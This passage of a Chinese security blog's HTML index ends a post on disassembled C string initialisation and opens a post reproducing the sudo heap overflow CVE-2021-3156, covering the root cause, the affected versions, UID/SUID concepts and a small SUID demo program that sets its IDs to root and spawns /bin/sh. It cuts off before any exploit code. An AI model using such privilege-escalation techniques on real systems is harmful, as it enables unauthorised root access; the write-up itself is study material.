class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400546</span> ; __unwind &#123;</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400546</span>                 push    rbp</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400547</span>                 mov     rbp, rsp</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040054</span>A                 sub     rsp, <span class=\"number\">120</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400551</span>                 mov     rax, fs:<span class=\"number\">28</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040055</span>A                 mov     [rbp<span class=\"number\">-8</span>], rax</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040055</span>E                 <span class=\"keyword\">xor</span>     eax, eax</span><br><span class=\"line\">\t<span class=\"comment\">//初始canary和预留栈</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//初始a为0，也就是说char a[10]会将10个字节都置为0</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400560</span>                 mov     qword ptr [rbp<span class=\"number\">-40</span>h], <span class=\"number\">0</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400568</span>                 mov     <span class=\"keyword\">word</span> ptr [rbp<span class=\"number\">-38</span>h], <span class=\"number\">0</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040056</span>E                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-40</span>h], <span class=\"number\">61</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400572</span>                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-3F</span>h], <span class=\"number\">61</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400576</span>                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-3</span>Eh], <span class=\"number\">61</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040057</span>A                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-3</span>Dh], <span class=\"number\">61</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040057</span>E                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-3</span>Ch], <span class=\"number\">61</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400582</span>                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-3B</span>h], <span class=\"number\">61</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400586</span>                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-3</span>Ah], <span class=\"number\">61</span>h</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给char m[]</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040058</span>A                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-60</span>h], <span class=\"number\">61</span>h</span><br><span class=\"line\">    <span class=\"comment\">//将只读字符串b赋值给al</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040058</span>E                 mov     eax, offset unk_400784</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400593</span>                 mov     [rbp<span class=\"number\">-5F</span>h], al</span><br><span class=\"line\">    <span class=\"comment\">//这里出现了问题，将寄存器低位(0x84)赋值给b中</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400596</span>                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-5</span>Eh], <span class=\"number\">63</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040059</span>A                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-5</span>Dh], <span class=\"number\">64</span>h</span><br><span class=\"line\">    <span class=\"comment\">//我们也就理解了为什么上面\" \"赋值给char[]时会出现错误</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给char n[]</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040059</span>E                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-50</span>h], <span class=\"number\">6</span>Dh</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005</span>A2                 mov     eax, offset aNnnn ; <span class=\"string\">\"nnnn\"</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005</span>A7                 mov     [rbp<span class=\"number\">-4F</span>h], al</span><br><span class=\"line\">    <span class=\"comment\">//和上面类似</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005</span>AA                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-4</span>Eh], <span class=\"number\">6F</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005</span>AE                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-4</span>Dh], <span class=\"number\">64</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005B</span>2                 mov     <span class=\"keyword\">byte</span> ptr [rbp<span class=\"number\">-4</span>Ch], <span class=\"number\">70</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005B</span>6                 mov     eax, offset aQ  ; <span class=\"string\">\"q\"</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005B</span>B                 mov     [rbp<span class=\"number\">-4B</span>h], al</span><br><span class=\"line\">    <span class=\"comment\">//和上面类似</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给char* b 此时栈上的地址只是指向b字符串的地址</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005B</span>E                 mov     qword ptr [rbp<span class=\"number\">-120</span>h], offset aBbbbbbb ; <span class=\"string\">\"bbbbbbb\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给char c[10]</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005</span>C9                 mov     rax, <span class=\"number\">63636363636363</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005</span>D3                 mov     [rbp<span class=\"number\">-30</span>h], rax</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005</span>D7                 mov     <span class=\"keyword\">word</span> ptr [rbp<span class=\"number\">-28</span>h], <span class=\"number\">0</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给char* d[10]</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005</span>DD                 lea     rdx, [rbp<span class=\"number\">-100</span>h]</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005E4</span>                 mov     eax, <span class=\"number\">0</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005E9</span>                 mov     ecx, <span class=\"number\">0</span>Ah</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005</span>EE                 mov     rdi, rdx</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005F</span>1                 rep stosq <span class=\"comment\">//将eax中的值复制到[rdi]处，且循环次数为ecx次</span></span><br><span class=\"line\">    <span class=\"comment\">//赋值是8字节</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005F</span>4                 mov     qword ptr [rbp<span class=\"number\">-100</span>h], <span class=\"number\">61</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004005F</span>F                 mov     qword ptr [rbp<span class=\"number\">-0F</span>8h], <span class=\"number\">62</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040060</span>A                 mov     qword ptr [rbp<span class=\"number\">-0F</span>0h], <span class=\"number\">63</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400615</span>                 mov     qword ptr [rbp<span class=\"number\">-0E8</span>h], <span class=\"number\">64</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400620</span>                 mov     qword ptr [rbp<span class=\"number\">-0E0</span>h], <span class=\"number\">65</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040062B</span>                 mov     qword ptr [rbp<span class=\"number\">-0</span>D8h], <span class=\"number\">66</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400636</span>                 mov     qword ptr [rbp<span class=\"number\">-0</span>D0h], <span class=\"number\">67</span>h</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给char* e[10]</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400641</span>                 lea     rdx, [rbp+var_B0]</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400648</span>                 mov     eax, <span class=\"number\">0</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040064</span>D                 mov     ecx, <span class=\"number\">0</span>Ah</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400652</span>                 mov     rdi, rdx</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400655</span>                 rep stosq</span><br><span class=\"line\">    <span class=\"comment\">//赋值同样是8字节，但不同的是只读字符串,不是直接赋ascii值</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400658</span>                 mov     qword ptr [rbp<span class=\"number\">-0B</span>0h], offset aA ; <span class=\"string\">\"a\"</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400663</span>                 mov     qword ptr [rbp<span class=\"number\">-0</span>A8h], offset unk_400784</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040066</span>E                 mov     qword ptr [rbp<span class=\"number\">-0</span>A0h], offset aC ; <span class=\"string\">\"c\"</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400679</span>                 mov     qword ptr [rbp<span class=\"number\">-98</span>h], offset aD ; <span class=\"string\">\"d\"</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">0000000000400684</span>                 mov     qword ptr [rbp<span class=\"number\">-90</span>h], offset aE ; <span class=\"string\">\"e\"</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040068F</span>                 mov     qword ptr [rbp<span class=\"number\">-88</span>h], offset asc_40079D ; <span class=\"string\">\"f\"</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">000000000040069</span>A                 mov     qword ptr [rbp<span class=\"number\">-80</span>h], offset aG ; <span class=\"string\">\"g\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给const char f[10]</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006</span>A2                 mov     rax, <span class=\"number\">66666666666666</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006</span>AC                 mov     [rbp<span class=\"number\">-20</span>h], rax</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006B</span>0                 mov     <span class=\"keyword\">word</span> ptr [rbp<span class=\"number\">-18</span>h], <span class=\"number\">0</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给const char* g</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006B</span>6                 mov     qword ptr [rbp<span class=\"number\">-118</span>h], offset aGgggggg ; <span class=\"string\">\"ggggggg\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给char* const h</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006</span>C1                 mov     qword ptr [rbp<span class=\"number\">-110</span>h], offset aHhhhhhh ; <span class=\"string\">\"hhhhhhh\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//赋值给const char* const i</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006</span>CC                 mov     qword ptr [rbp<span class=\"number\">-108</span>h], offset aIiiiiii ; <span class=\"string\">\"iiiiiii\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006</span>D7                 mov     eax, <span class=\"number\">0</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006</span>DC                 mov     rsi, [rbp<span class=\"number\">-8</span>]</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006E0</span>                 <span class=\"keyword\">xor</span>     rsi, fs:<span class=\"number\">28</span>h</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006E9</span>                 jz      short locret_4006F0</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006</span>EB                 call    ___stack_chk_fail</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006F</span>0 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006F</span>0</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006F</span>0 locret_4006F0:                          ; CODE XREF: main+<span class=\"number\">1</span>A3↑j</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006F</span>0                 leave</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006F</span>1                 retn</span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006F</span>1 ; &#125; <span class=\"comment\">// starts at 400546</span></span><br><span class=\"line\">.<span class=\"built_in\">text</span>:<span class=\"number\">00000000004006F</span>1 main            endp</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h1><p>一个一个来说</p>\n<ol>\n<li><pre><code>char a[10]={&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;,&#39;a&#39;};\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    这个首先会把10个位置都置为0，然后直接向栈上赋值ascii值</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br></pre></td></tr></table></figure>\nchar m[]={&#39;a&#39;,&quot;b&quot;,&#39;c&#39;,&#39;d&#39;};\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    这个很明显是有问题的，其中赋值字符串，由于莫名奇妙的错误，导致只赋值了寄存器低位</span><br><span class=\"line\"></span><br><span class=\"line\">3.</span><br></pre></td></tr></table></figure>\nchar n[]={&#39;m&#39;,&quot;nnnn&quot;,&#39;o&#39;,&#39;d&#39;,&#39;p&#39;,&quot;q&quot;};\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    有问题+1,同样是赋值字符串，和上面是一样的错误</span><br><span class=\"line\"></span><br><span class=\"line\">4.</span><br></pre></td></tr></table></figure>\nchar* b=&quot;bbbbbbb&quot;;\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    常用的方法，直接往栈上赋值给字符串(只读数据)所在的地址</span><br><span class=\"line\"></span><br><span class=\"line\">    &gt;注：存放于栈的指针b可以被修改，但是指向的数据’bbbbbbb&#39;无法更改，</span><br><span class=\"line\"></span><br><span class=\"line\">5.</span><br></pre></td></tr></table></figure>\nchar c[10]=&quot;ccccccc&quot;;\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    看似和上一个一样，实则是往栈上赋值ascii值</span><br><span class=\"line\"></span><br><span class=\"line\">6.</span><br></pre></td></tr></table></figure>\nchar* d[10]={&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;};\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    这个其实是最神奇的，每个字符都占8个字节，由于栈上是ascii值，导致寻址时出现了错误</span><br><span class=\"line\"></span><br><span class=\"line\">7.</span><br></pre></td></tr></table></figure>\nchar* e[10]={&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;};\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    字符串的地址直接赋值到栈上，然后寻址即可</span><br><span class=\"line\"></span><br><span class=\"line\">8.</span><br></pre></td></tr></table></figure>\nconst char f[10]={&quot;fffffff&quot;};\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    直接往栈上赋ascii值,**虽然声明了是const，但栈上的值是可更改的**</span><br><span class=\"line\"></span><br><span class=\"line\">9.</span><br></pre></td></tr></table></figure>\nconst char* g=&quot;ggggggg&quot;;\nchar* const h=&quot;hhhhhhh&quot;;\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    这两个看起来是无差别的，都是栈上赋值给字符串的地址</span><br><span class=\"line\"></span><br><span class=\"line\">10.</span><br></pre></td></tr></table></figure>\n const char* const i = &quot;iiiiiii&quot;;\n</code></pre><p> 和9类似</p>\n</li>\n</ol>\n","categories":[],"tags":["c"]},{"title":"CVE-2021-3156复现","url":"https://pz1o.top/2021/04/13/CVE-2021-3156复现/","content":"<p>第一次来复现</p>\n<h1 id=\"0x01-介绍\"><a href=\"#0x01-介绍\" class=\"headerlink\" title=\"0x01 介绍\"></a>0x01 介绍</h1><p>2021年01月26日，sudo发布安全通告，修复了一个类Unix操作系统中sudo命令基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），任何本地用户（普通用户和系统用户，sudoer和非sudoers）都可以利用此漏洞，而无需进行身份验证，攻击者不需要知道用户的密码。成功利用此漏洞提权获得root权限</p>\n<h1 id=\"0x02-影响环境\"><a href=\"#0x02-影响环境\" class=\"headerlink\" title=\"0x02 影响环境\"></a>0x02 影响环境</h1><p>- sudo:sudo: 1.8.2 - 1.8.31p2</p>\n<p>- sudo:sudo: 1.9.0 - 1.9.5p1</p>\n<h1 id=\"0x03-漏洞简要\"><a href=\"#0x03-漏洞简要\" class=\"headerlink\" title=\"0x03 漏洞简要\"></a>0x03 漏洞简要</h1><p>CVE-2021-3156 ——<code>sudo</code>在处理单个反斜杠结尾的命令时，发生逻辑错误，存在堆溢出漏洞。当 <code>sudo</code>通过 <code>-s</code> 或 <code>-i</code>命令行选项在 <code>shell</code>模式下运行命令时，他将在命令参数中使用反斜杠转义特殊字符。但使用 <code>-s</code>或 <code>-i</code>标志运行 <code>sudoedit</code>时，实际上并未进行转义，从而导致堆溢出。</p>\n<h1 id=\"0x04-基础知识\"><a href=\"#0x04-基础知识\" class=\"headerlink\" title=\"0x04 基础知识\"></a>0x04 基础知识</h1><p>先了解几个基本概念</p>\n<h2 id=\"1-RUID、EUID、SUID、RGID、EGID、SGID\"><a href=\"#1-RUID、EUID、SUID、RGID、EGID、SGID\" class=\"headerlink\" title=\"1. RUID、EUID、SUID、RGID、EGID、SGID\"></a>1. RUID、EUID、SUID、RGID、EGID、SGID</h2><ul>\n<li>RUID RGID：real UID/real GID 用于标识我是谁，也就是登录用户的UID和GID，加入系统以pz1o登录，在Linux运行的所有的命令的实际用户ID都是pz1o的UID，实际用户组ID都是pz1o的GID</li>\n<li>EUID EGID：effective UID/effective GID <strong>在创建与访问文件的时候发挥作用</strong>，创建文件时，系统内核将<strong>根据创建文件的进程的EUID与EGID设定文件的所有者/组属性</strong>，而在访问文件时，内核亦根<strong>据访问进程的EUID与EGID决定其能否访问文件</strong>。<strong>一般情况下</strong>，<strong>有效用户ID（EUID）等于实际用户ID（RUID）。</strong></li>\n<li>SUID SGID：saved UID <strong>SUID属性只能运用在可执行文件上，当用户执行该执行文件时，会临时拥有该执行文件所有者的权限</strong>,简单来说s是无效的，S是有效的。当s标志出现在用户组的 x 权限时称为 SGID。\\</li>\n</ul>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/1612508511569-2c61faaf-e6de-41db-b746-a7cdb5b0149f-1618586880599.png\" alt=\"image.png\"></p>\n<h2 id=\"2-基本指令\"><a href=\"#2-基本指令\" class=\"headerlink\" title=\"2. 基本指令\"></a>2. 基本指令</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ~  whoami <span class=\"comment\">#显示的是当前用户下的用户名</span></span><br><span class=\"line\">pz1o</span><br><span class=\"line\">➜  ~  who   <span class=\"comment\">#显示当前真正登录系统中的用户</span></span><br><span class=\"line\">pz1o     tty7         2021-03-31 20:50 (:0)</span><br><span class=\"line\">➜  ~  su</span><br><span class=\"line\">Password: </span><br><span class=\"line\">root@pz1o:/home/pz1o<span class=\"comment\"># who</span></span><br><span class=\"line\">pz1o     tty7         2021-03-31 20:50 (:0)</span><br><span class=\"line\">root@pz1o:/home/pz1o<span class=\"comment\"># whoami</span></span><br><span class=\"line\">root</span><br><span class=\"line\">groups</span><br><span class=\"line\">//查看当前组的用户</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-权限提升\"><a href=\"#3-权限提升\" class=\"headerlink\" title=\"3. 权限提升\"></a>3. 权限提升</h2><h3 id=\"su-root\"><a href=\"#su-root\" class=\"headerlink\" title=\"su root\"></a>su root</h3><p>登陆后<strong>没有时间限制</strong></p>\n<h3 id=\"sudo-i\"><a href=\"#sudo-i\" class=\"headerlink\" title=\"sudo -i\"></a>sudo -i</h3><p>设置这条命令是为了频繁的执行某些只有超级用户才能执行的命令而不用每次输入密码。</p>\n<p><strong>提权之后没有时间限制</strong></p>\n<h3 id=\"sudo-su\"><a href=\"#sudo-su\" class=\"headerlink\" title=\"sudo su\"></a>sudo su</h3><p>sudo su表示运行sudo命令给su命令提权，运行su命令。 要求执行该命令的用户<strong>必须在sudoers中才可以完成提权。</strong>与之前的sudo -i不同的是，在完成提权之后pwd不会改变为/root。</p>\n<h1 id=\"0x05-Demo\"><a href=\"#0x05-Demo\" class=\"headerlink\" title=\"0x05 Demo\"></a>0x05 Demo</h1><p>这里有一个关于suid引起提权的demo</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    system(<span class=\"string\">\"id\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"whoami\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"##################################################\"</span>);</span><br><span class=\"line\">    setgid(<span class=\"number\">0</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"id\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"whoami\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"##################################################\"</span>);</span><br><span class=\"line\">    setuid(<span class=\"number\">0</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"id\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"whoami\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"##################################################\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"/bin/sh\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>运行一下</p>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412152631059-1618586880599.png\" alt=\"image-20210412152631059\"></p>\n<p>提权尚未成功</p>\n<figure class=\"highlight plain\"><table><tr><td 